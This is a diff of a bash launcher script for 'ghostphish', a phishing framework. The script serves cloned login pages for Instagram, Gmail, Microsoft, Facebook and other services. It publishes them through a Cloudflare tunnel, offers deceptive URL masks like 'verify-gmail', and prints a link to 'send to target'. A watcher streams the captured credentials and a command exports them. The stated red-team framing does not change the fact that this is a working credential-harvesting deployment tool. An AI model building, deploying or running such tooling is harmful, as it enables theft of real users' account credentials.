@@ -1,96 +1,81 @@
 #!/usr/bin/env bash
 #
-# ghostphish — interactive CLI launcher (zphisher-style)
+# ghostphish — interactive CLI launcher
 # Developed by Yaman.RedTeam
 #
 
 set -o pipefail
 
-# ─── Colors — hacker palette ──────────────────────
-R='\033[0;31m'     # red
-G='\033[0;32m'     # green (matrix)
-Y='\033[1;33m'     # yellow
-C='\033[0;36m'     # cyan
-B='\033[1;34m'     # blue
-M='\033[1;35m'     # magenta
-W='\033[1;37m'     # white
-RB='\033[1;31m'    # bright red
-GB='\033[1;32m'    # bright green
-YB='\033[1;33m'    # bright yellow
-CB='\033[1;36m'    # bright cyan
-BB='\033[1;34m'    # bright blue
-MB='\033[1;35m'    # bright magenta
-BOLD='\033[1m'
-DIM='\033[2m'
-ITA='\033[3m'
-BLINK='\033[5m'
-INV='\033[7m'
-N='\033[0m'
-
-# Text with red-magenta gradient for the wordmark
-gradient() {
-    local text="$1"
-    local -a colors=('\033[38;5;196m' '\033[38;5;197m' '\033[38;5;198m' '\033[38;5;199m' '\033[38;5;200m' '\033[38;5;201m')
-    local out="" len=${#text} i char cidx
-    for ((i=0; i<len; i++)); do
-        char="${text:$i:1}"
-        cidx=$(( i * ${#colors[@]} / len ))
-        out+="${colors[$cidx]}${char}"
-    done
-    echo -en "${out}\033[0m"
-}
+# ─── Colors ───────────────────────────────────────
+R=$'\033[38;5;196m'    # brand red
+RD=$'\033[38;5;124m'   # dark red
+G=$'\033[38;5;46m'     # matrix green
+GD=$'\033[38;5;28m'    # dark green
+Y=$'\033[38;5;220m'    # amber
+C=$'\033[38;5;51m'     # cyan accent
+CD=$'\033[38;5;38m'    # muted cyan
+B=$'\033[38;5;39m'     # blue
+W=$'\033[38;5;255m'    # bright white
+GY=$'\033[38;5;244m'   # neutral gray
+D=$'\033[2m'           # dim
+BLD=$'\033[1m'         # bold
+N=$'\033[0m'           # reset
 
 PORT=8000
+VERSION="1.0.0"
 SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
 LOG_FILE="/tmp/ghostphish_tunnel.log"
 PID_FILE="/tmp/ghostphish_tunnel.pid"
+WIDTH=64
 
-# ─── Templates ────────────────────────────────────
-declare -a TEMPLATES=(
-    "instagram|📸|Instagram|Dark theme, close friends hero"
-    "facebook|📘|Facebook|White bg, photo cards, real logos"
-    "netflix|🎬|Netflix|Dark hero, red wordmark"
-    "twitter|✖️|Twitter / X|Black bg, huge X logo, SSO buttons"
-    "linkedin|💼|LinkedIn|Beige bg, professional style"
-    "snapchat|👻|Snapchat|Yellow header, ghost logo"
-    "microsoft|🪟|Microsoft|Cosmic dark bg, 2-step OAuth"
-    "gmail|📧|Gmail|Dark theme, colored G, 2-step flow"
+# ─── Templates: slug|Name|description ─────────────
+TEMPLATES=(
+    "instagram|Instagram|dark theme · close friends hero"
+    "facebook|Facebook|photo collage · pill buttons"
+    "netflix|Netflix|dark hero · red wordmark"
+    "twitter|Twitter (X)|black bg · huge X · SSO"
+    "linkedin|LinkedIn|beige · professional"
+    "snapchat|Snapchat|yellow · ghost logo"
+    "microsoft|Microsoft|cosmic bg · 2-step OAuth"
+    "gmail|Gmail|dark · colored G · 2-step"
 )
 
-# ─── Helpers — hacker aesthetic ───────────────────
+# ─── Layout helpers ───────────────────────────────
+hr() {
+    local ch="${1:-─}"
+    local col="${2:-$GY}"
+    printf "${col}"
+    printf "${ch}%.0s" $(seq 1 $WIDTH)
+    printf "${N}\n"
+}
+
+section() {
+    printf "\n  ${R}▍${N} ${W}${BLD}%s${N}\n" "$1"
+    printf "  ${D}"
+    printf "─%.0s" $(seq 1 $WIDTH)
+    printf "${N}\n"
+}
+
+kv() {
+    # key value with dot-leader
+    local key="$1" val="$2" keycol="${3:-$GY}" valcol="${4:-$W}"
+    printf "    ${keycol}%-14s${N} ${valcol}%s${N}\n" "$key" "$val"
+}
+
+msg_ok()   { printf "  ${G}[+]${N} %s\n" "$*"; }
+msg_err()  { printf "  ${R}[!]${N} %s\n" "$*"; }
+msg_info() { printf "  ${C}[*]${N} %s\n" "$*"; }
+msg_warn() { printf "  ${Y}[~]${N} %s\n" "$*"; }
+
 banner() {
     clear
-    echo ""
-    echo -e "${RB}   ╔══════════════════════════════════════════════════════════════════╗${N}"
-    echo -e "${RB}   ║${N}                                                                  ${RB}║${N}"
-    echo -e "${RB}   ║${N}       ${GB}[${N} ${C}modern phishing framework${N} ${GB}·${N} ${YB}v1.0.0${N} ${GB}]${N}              ${RB}║${N}"
-    echo -e "${RB}   ║${N}    ${DIM}Developed by${N} $(gradient 'Yaman.RedTeam')  ${DIM}·${N}  ${DIM}github/Yaman-RedTeam${N}   ${RB}║${N}"
-    echo -e "${RB}   ║${N}                                                                  ${RB}║${N}"
-    echo -e "${RB}   ╚══════════════════════════════════════════════════════════════════╝${N}"
-    echo -e "   ${GB}${BLINK}●${N} ${G}booted${N}   ${GB}${BLINK}●${N} ${G}armed${N}   ${GB}${BLINK}●${N} ${G}silent${N}   ${GB}${BLINK}●${N} ${G}listening${N}"
-    echo ""
-}
-
-msg_ok()   { echo -e "   ${GB}[${G}✓${GB}]${N} ${W}$*${N}"; }
-msg_err()  { echo -e "   ${RB}[${R}✗${RB}]${N} ${W}$*${N}"; }
-msg_info() { echo -e "   ${CB}[${C}i${CB}]${N} ${W}$*${N}"; }
-msg_warn() { echo -e "   ${YB}[${Y}!${YB}]${N} ${W}$*${N}"; }
-
-# Typewriter effect (fast)
-typewrite() {
-    local text="$1"
-    local delay="${2:-0.005}"
-    local i
-    for ((i=0; i<${#text}; i++)); do
-        printf "%s" "${text:$i:1}"
-        sleep "$delay"
-    done
-    echo ""
-}
-
-pause_for() {
-    echo ""
-    read -rp "  $(echo -e ${DIM})Press Enter to continue$(echo -e ${N})" _
+    printf "\n"
+    printf "  ${R}▄▄${N}  ${W}${BLD}ghostphish${N}  ${D}v${VERSION}${N}\n"
+    printf "  ${R}▀▀${N}  ${GY}modern phishing framework for authorized red-team ops${N}\n"
+    printf "  ${GY}     Developed by ${R}Yaman.RedTeam${GY} · github.com/Yaman-RedTeam/ghostphish${N}\n"
+    printf "  "
+    hr "─" "$D"
+    printf "\n"
 }
 
 # ─── Dependency checks ────────────────────────────
@@ -100,13 +85,13 @@ check_deps() {
     (command -v docker-compose >/dev/null 2>&1 || docker compose version >/dev/null 2>&1) || missing+=("docker-compose")
 
     if [ ${#missing[@]} -ne 0 ]; then
-        msg_err "Missing dependencies: ${missing[*]}"
-        msg_info "Install docker + docker-compose, then re-run."
+        msg_err "missing: ${missing[*]}"
+        msg_info "install docker + docker-compose, then re-run"
         exit 1
     fi
 
     if ! docker info >/dev/null 2>&1; then
-        msg_err "Docker daemon not running — start it first."
+        msg_err "docker daemon not running"
         exit 1
     fi
 }
@@ -118,16 +103,16 @@ is_running() {
 
 start_container() {
     if is_running; then
-        msg_ok "ghostphish already running on port ${PORT}"
+        msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N}"
         return 0
     fi
-    msg_info "Starting Docker container..."
-    (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) | tail -3
+    msg_info "booting container..."
+    (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) > /dev/null
     sleep 3
     if is_running; then
-        msg_ok "Container up on http://localhost:${PORT}"
+        msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N}"
     else
-        msg_err "Container failed to start. Check: docker logs ghostphish"
+        msg_err "container failed to start · docker logs ghostphish"
         exit 1
     fi
 }
@@ -135,190 +120,177 @@ start_container() {
 # ─── Cloudflared tunnel ───────────────────────────
 start_tunnel() {
     if ! command -v cloudflared >/dev/null 2>&1; then
-        msg_warn "cloudflared not installed — falling back to localhost."
-        msg_info "Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
-        echo ""
+        msg_warn "cloudflared missing · falling back to localhost"
         TUNNEL_URL="http://localhost:${PORT}"
         return 1
     fi
 
-    echo ""
-    echo -e "   ${CB}┌─${N}${W} TUNNEL DEPLOY ${N}${CB}────────────────────────────────────────────┐${N}"
-    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
-    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}killing stale tunnels...${N}                                ${CB}│${N}"
-    pkill -f "cloudflared tunnel" 2>/dev/null; sleep 1
+    msg_info "deploying cloudflare quick-tunnel..."
+    pkill -f "cloudflared tunnel" 2>/dev/null
+    sleep 1
     : > "$LOG_FILE"
-    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}connecting to Cloudflare edge...${N}                        ${CB}│${N}"
 
     cloudflared tunnel --url "http://localhost:${PORT}" --no-autoupdate > "$LOG_FILE" 2>&1 &
     TUNNEL_PID=$!
     echo $TUNNEL_PID > "$PID_FILE"
 
-    # Spinner while waiting
-    local spinner_chars=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
+    # Braille spinner
+    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
     TUNNEL_URL=""
     for i in {1..30}; do
         TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
-        if [[ -n "$TUNNEL_URL" ]]; then
-            printf "\r   ${CB}│${N}   ${G}▶${N} ${DIM}quick-tunnel URL acquired${N}                             ${CB}│${N}\n"
-            break
-        fi
-        printf "\r   ${CB}│${N}   ${Y}${spinner_chars[$((i % 10))]}${N} ${DIM}waiting for URL...${N}                                       ${CB}│${N}"
+        [[ -n "$TUNNEL_URL" ]] && { printf "\r  ${G}[+]${N} tunnel handshake ok                          \n"; break; }
+        printf "\r  ${Y}${frames[$((i % 10))]}${N}  waiting for cloudflare edge... (${i}s)"
         sleep 1
     done
-    echo ""
 
     if [[ -z "$TUNNEL_URL" ]]; then
-        echo -e "   ${CB}│${N}   ${R}✗${N} ${R}tunnel failed${N}                                            ${CB}│${N}"
-        echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
-        msg_err "Check $LOG_FILE"
+        printf "\r%*s\r" $WIDTH " "
+        msg_err "tunnel timeout · see ${LOG_FILE}"
         TUNNEL_URL="http://localhost:${PORT}"
         return 1
     fi
 
-    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}handshake ok · TLS pinned · edge=cloudflare${N}             ${CB}│${N}"
-    echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
-    echo ""
-    msg_ok "tunnel LIVE ${DIM}→${N} ${GB}${TUNNEL_URL}${N}"
-    sleep 1
+    # Warm-up wait — edge takes ~5-15s to be reachable
+    msg_info "warming edge..."
+    for i in {1..15}; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${TUNNEL_URL}/health")
+        [ "$code" = "200" ] && break
+        sleep 1
+    done
+    msg_ok "tunnel live ${D}→${N} ${C}${TUNNEL_URL}${N}"
     return 0
 }
 
 # ─── Template menu ────────────────────────────────
 show_menu() {
     banner
-    echo -e "   ${MB}┌─${N}${W} SELECT TARGET TEMPLATE ${N}${MB}────────────────────────────────────┐${N}"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
+    section "SELECT TEMPLATE"
+    printf "\n"
     local i=1
     for t in "${TEMPLATES[@]}"; do
-        IFS='|' read -r slug icon name desc <<< "$t"
-        printf "   ${MB}│${N}   ${YB}[%2d]${N}  ${icon}  ${GB}%-14s${N}  ${DIM}%-27s${N}   ${MB}│${N}\n" "$i" "$name" "$desc"
+        IFS='|' read -r slug name desc <<< "$t"
+        printf "    ${Y}%2d)${N}  ${W}%-14s${N} ${D}%s${N}\n" "$i" "$name" "$desc"
         i=$((i+1))
     done
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    printf "   ${MB}│${N}   ${YB}[ 0]${N}  ${R}⏻${N}  ${R}Exit${N}                                            ${MB}│${N}\n"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
-    echo ""
+    printf "\n"
+    printf "     ${GY}0)${N}  ${D}exit${N}\n"
+    printf "\n"
 }
 
 pick_template() {
     while true; do
         show_menu
-        read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/phish${N}${W}#${N} ")" choice
+        printf "  ${R}phish${N}${D}@${N}${W}ghost${N} ${GY}⟩${N} "
+        read -r choice
         if [[ "$choice" == "0" ]]; then
-            echo ""
-            echo -e "   ${RB}[${R}✗${RB}]${N} ${DIM}session terminated.${N}"
-            echo -e "   ${DIM}stay hidden.${N}"
-            echo ""
+            printf "\n  ${D}session closed.${N}\n\n"
             exit 0
         fi
         if [[ "$choice" =~ ^[1-9][0-9]*$ ]] && (( choice >= 1 && choice <= ${#TEMPLATES[@]} )); then
-            IFS='|' read -r SEL_SLUG SEL_ICON SEL_NAME SEL_DESC <<< "${TEMPLATES[$((choice-1))]}"
+            IFS='|' read -r SEL_SLUG SEL_NAME SEL_DESC <<< "${TEMPLATES[$((choice-1))]}"
             return 0
         fi
-        msg_err "Invalid choice — enter a number from the menu."
+        msg_err "invalid choice"
         sleep 1
     done
 }
 
-# ─── Delivery mode menu ───────────────────────────
+# ─── Delivery mode ────────────────────────────────
 pick_mode() {
     banner
-    echo -e "   ${DIM}target locked ▸${N} ${SEL_ICON}  ${GB}${SEL_NAME}${N}"
-    echo ""
-    echo -e "   ${CB}┌─${N}${W} DEPLOYMENT VECTOR ${N}${CB}────────────────────────────────────────┐${N}"
-    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
-    printf "   ${CB}│${N}   ${YB}[1]${N}  ${G}⚡${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${CB}│${N}\n" "Cloudflared tunnel" "public HTTPS · no account"
-    printf "   ${CB}│${N}   ${YB}[2]${N}  ${C}⚙${N}   ${GB}%-22s${N} ${DIM}%-25s${N}   ${CB}│${N}\n" "Localhost only" "same-machine testing"
-    printf "   ${CB}│${N}   ${YB}[0]${N}  ${R}←${N}  ${R}%-22s${N}                          ${CB}│${N}\n" "Back"
-    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
-    echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
-    echo ""
-    read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/vector${N}${W}#${N} ")" mode_choice
+    section "DELIVERY MODE"
+    printf "\n"
+    kv "target" "${SEL_NAME} ${D}(${SEL_DESC})${N}" "$GY" "$C"
+    printf "\n"
+    printf "    ${Y}1)${N}  ${W}%-22s${N} ${D}%s${N}\n" "cloudflared tunnel"  "public HTTPS · no account"
+    printf "    ${Y}2)${N}  ${W}%-22s${N} ${D}%s${N}\n" "localhost"           "same-machine testing"
+    printf "     ${GY}0)${N}  ${D}back${N}\n"
+    printf "\n"
+    printf "  ${R}phish${N}${D}@${N}${W}mode${N}  ${GY}⟩${N} "
+    read -r mode_choice
     case "$mode_choice" in
         1) DELIVERY="tunnel" ;;
-        2) DELIVERY="local" ;;
+        2) DELIVERY="localhost" ;;
         0) return 1 ;;
-        *) msg_err "Invalid choice"; sleep 1; return 1 ;;
+        *) msg_err "invalid"; sleep 1; return 1 ;;
     esac
     return 0
 }
 
-# ─── Custom URL path ──────────────────────────────
+# ─── URL path ─────────────────────────────────────
 pick_url_path() {
     banner
-    echo -e "   ${DIM}target ▸${N} ${SEL_ICON}  ${GB}${SEL_NAME}${N}   ${DIM}vector ▸${N} ${YB}${DELIVERY}${N}"
-    echo ""
-    echo -e "   ${MB}┌─${N}${W} URL MASK ${N}${MB}─────────────────────────────────────────────────┐${N}"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    printf "   ${MB}│${N}   ${YB}[1]${N}  ${C}⚪${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Default" "/${SEL_SLUG}"
-    printf "   ${MB}│${N}   ${YB}[2]${N}  ${G}✏️${N}   ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Custom path" "type your own disguise"
-    printf "   ${MB}│${N}   ${YB}[3]${N}  ${Y}⚡${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Quick presets" "realistic-looking suggestions"
-    printf "   ${MB}│${N}   ${YB}[0]${N}  ${R}←${N}  ${R}%-22s${N}                          ${MB}│${N}\n" "Back"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
-    echo ""
-    read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/mask${N}${W}#${N} ")" path_choice
+    section "URL MASK"
+    printf "\n"
+    kv "target" "${SEL_NAME}" "$GY" "$C"
+    kv "mode"   "${DELIVERY}" "$GY" "$C"
+    printf "\n"
+    printf "    ${Y}1)${N}  ${W}%-22s${N} ${D}%s${N}\n" "default"       "/${SEL_SLUG}"
+    printf "    ${Y}2)${N}  ${W}%-22s${N} ${D}%s${N}\n" "custom path"   "type your own"
+    printf "    ${Y}3)${N}  ${W}%-22s${N} ${D}%s${N}\n" "preset masks"  "realistic suggestions"
+    printf "     ${GY}0)${N}  ${D}back${N}\n"
+    printf "\n"
+    printf "  ${R}phish${N}${D}@${N}${W}mask${N}  ${GY}⟩${N} "
+    read -r path_choice
 
     case "$path_choice" in
         1) URL_PATH="$SEL_SLUG" ;;
         2)
-            echo ""
-            echo -e "  ${DIM}Enter custom path (letters, digits, - only). Ex: ${SEL_SLUG}-login-verify${N}"
-            read -rp "  $(echo -e ${G})custom${N} > " URL_PATH
+            printf "\n  ${D}(lowercase, digits, hyphens · e.g. ${SEL_SLUG}-login-verify)${N}\n"
+            printf "  ${R}custom${N} ${GY}⟩${N} "
+            read -r URL_PATH
             URL_PATH=$(echo "$URL_PATH" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | sed 's/^-*//; s/-*$//')
-            if [[ -z "$URL_PATH" ]]; then
-                msg_err "Empty path"; sleep 1; return 1
-            fi
+            [[ -z "$URL_PATH" ]] && { msg_err "empty path"; sleep 1; return 1; }
             register_alias "$URL_PATH" "$SEL_SLUG" || return 1
             ;;
         3)
             banner
-            echo -e "  Presets for ${W}${SEL_NAME}${N}:\n"
-            local -a PRESETS=(
+            section "PRESET MASKS · ${SEL_NAME}"
+            local presets=(
                 "${SEL_SLUG}login"
                 "${SEL_SLUG}-login"
                 "login-${SEL_SLUG}"
                 "verify-${SEL_SLUG}"
                 "${SEL_SLUG}-verify-account"
                 "secure-${SEL_SLUG}"
-                "${SEL_SLUG}-account-verify"
+                "${SEL_SLUG}-account-check"
                 "auth-${SEL_SLUG}"
             )
+            printf "\n"
             local i=1
-            for p in "${PRESETS[@]}"; do
-                printf "   ${Y}[%d]${N}  ${W}%s${N}\n" "$i" "$p"
+            for p in "${presets[@]}"; do
+                printf "    ${Y}%2d)${N}  ${W}%s${N}\n" "$i" "/$p"
                 i=$((i+1))
             done
-            echo ""
-            read -rp "  $(echo -e ${G})preset${N} > " ps
-            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#PRESETS[@]} )); then
-                URL_PATH="${PRESETS[$((ps-1))]}"
+            printf "\n"
+            printf "  ${R}preset${N} ${GY}⟩${N} "
+            read -r ps
+            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#presets[@]} )); then
+                URL_PATH="${presets[$((ps-1))]}"
                 register_alias "$URL_PATH" "$SEL_SLUG" || return 1
             else
-                msg_err "Invalid"; sleep 1; return 1
+                msg_err "invalid"; sleep 1; return 1
             fi
             ;;
         0) return 1 ;;
-        *) msg_err "Invalid"; sleep 1; return 1 ;;
+        *) msg_err "invalid"; sleep 1; return 1 ;;
     esac
     return 0
 }
 
 register_alias() {
-    local path="$1"
-    local tpl="$2"
+    local path="$1" tpl="$2"
     local resp
     resp=$(curl -s -X POST "http://localhost:${PORT}/admin/aliases" \
         -H "Content-Type: application/json" \
         -d "{\"path\":\"${path}\",\"template\":\"${tpl}\"}")
     if echo "$resp" | grep -q '"success":true'; then
-        msg_ok "Alias registered: /${path} → ${tpl}"
+        msg_ok "alias set ${D}·${N} /${path} ${D}→${N} ${tpl}"
         sleep 1
         return 0
     else
-        msg_err "Failed to register alias: $resp"
+        msg_err "alias failed · $resp"
         sleep 2
         return 1
     fi
@@ -329,66 +301,61 @@ show_link() {
     banner
     local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"
 
-    echo -e "   ${GB}╔══════════════════════════════════════════════════════════════╗${N}"
-    echo -e "   ${GB}║${N}                    ${GB}⚡  PAYLOAD ARMED  ⚡${N}                     ${GB}║${N}"
-    echo -e "   ${GB}╚══════════════════════════════════════════════════════════════╝${N}"
-    echo ""
-    echo -e "   ${DIM}target${N}   ${SEL_ICON}  ${GB}${SEL_NAME}${N} ${DIM}(${SEL_DESC})${N}"
-    echo -e "   ${DIM}vector${N}   ${Y}⚡${N}  ${W}${DELIVERY}${N}"
-    echo -e "   ${DIM}mask${N}     ${M}/${URL_PATH:-$SEL_SLUG}${N}"
-    echo ""
-    echo -e "   ${MB}┌─${N}${W} PHISHING LINK ${N}${MB}────────────────────────────────────────────┐${N}"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    echo -e "   ${MB}│${N}   ${GB}${BOLD}${full_url}${N}"
-    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
-    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
-    echo ""
-    echo -e "   ${DIM}◈${N} ${CB}admin${N}     ${DIM}${TUNNEL_URL}/admin/captures${N}"
-    echo -e "   ${DIM}◈${N} ${CB}stats${N}     ${DIM}python3 stats.py${N}"
-    echo -e "   ${DIM}◈${N} ${CB}export${N}    ${DIM}python3 export_captures.py csv${N}"
-    if [[ "$DELIVERY" == "tunnel" ]]; then
-        echo -e "   ${DIM}◈${N} ${CB}tun.log${N}   ${DIM}tail -f ${LOG_FILE}${N}"
-    fi
-    echo ""
-    echo -e "   ${RB}╔══════════════════════════════════════════════════════════════╗${N}"
-    echo -e "   ${RB}║${N}     ${G}${BLINK}●${N} ${W}LIVE CAPTURE STREAM${N}   ${DIM}[ctrl+c to detach]${N}          ${RB}║${N}"
-    echo -e "   ${RB}╚══════════════════════════════════════════════════════════════╝${N}"
-    echo -e "   ${DIM}${ITA}listening on the wire...${N}"
-    echo ""
+    section "PAYLOAD ARMED"
+    printf "\n"
+    kv "template" "${SEL_NAME} ${D}(${SEL_DESC})${N}" "$GY" "$C"
+    kv "vector"   "${DELIVERY}"                        "$GY" "$C"
+    kv "mask"     "/${URL_PATH:-$SEL_SLUG}"            "$GY" "$C"
+    printf "\n"
 
-    # Reliable Python watcher — polls admin API every 2s
+    printf "    ${GY}link ${D}(send to target)${N}\n"
+    printf "    ${G}${BLD}${full_url}${N}\n\n"
+
+    section "OPERATIONS"
+    printf "\n"
+    kv "admin"    "${TUNNEL_URL}/admin/captures"       "$GY" "$D"
+    kv "stats"    "python3 stats.py"                   "$GY" "$D"
+    kv "export"   "python3 export_captures.py csv"     "$GY" "$D"
+    [[ "$DELIVERY" == "tunnel" ]] && kv "tun.log" "tail -f ${LOG_FILE}" "$GY" "$D"
+    printf "\n"
+
+    section "LIVE CAPTURES ${D}· ctrl+c to detach${N}"
+    printf "\n    ${D}${G}●${N} ${D}listening...${N}\n\n"
+
     python3 "${SCRIPT_DIR}/watch_captures.py"
 }
 
-# ─── Main flow ────────────────────────────────────
+# ─── Main ─────────────────────────────────────────
 main() {
     banner
-    msg_info "Checking dependencies..."
+    section "PREFLIGHT"
+    printf "\n"
     check_deps
-    msg_ok "docker + docker-compose present"
-
+    msg_ok "docker + docker-compose"
     if command -v cloudflared >/dev/null 2>&1; then
-        msg_ok "cloudflared present ($(cloudflared --version 2>&1 | head -1 | awk '{print $3}'))"
+        local cfv
+        cfv=$(cloudflared --version 2>&1 | head -1 | awk '{print $3}')
+        msg_ok "cloudflared ${D}${cfv}${N}"
     else
-        msg_warn "cloudflared not installed (localhost-only mode available)"
+        msg_warn "cloudflared missing · localhost-only mode"
     fi
-    sleep 1
-
     start_container
+    sleep 1
 
     while true; do
         pick_template
-        if pick_mode; then
-            URL_PATH=""
-            if ! pick_url_path; then continue; fi
-            if [[ "$DELIVERY" == "tunnel" ]]; then
-                banner
-                start_tunnel
-            else
-                TUNNEL_URL="http://localhost:${PORT}"
-            fi
-            show_link
+        pick_mode || continue
+        URL_PATH=""
+        pick_url_path || continue
+        if [[ "$DELIVERY" == "tunnel" ]]; then
+            banner
+            section "TUNNEL DEPLOY"
+            printf "\n"
+            start_tunnel
+        else
+            TUNNEL_URL="http://localhost:${PORT}"
         fi
+        show_link
     done
 }
 
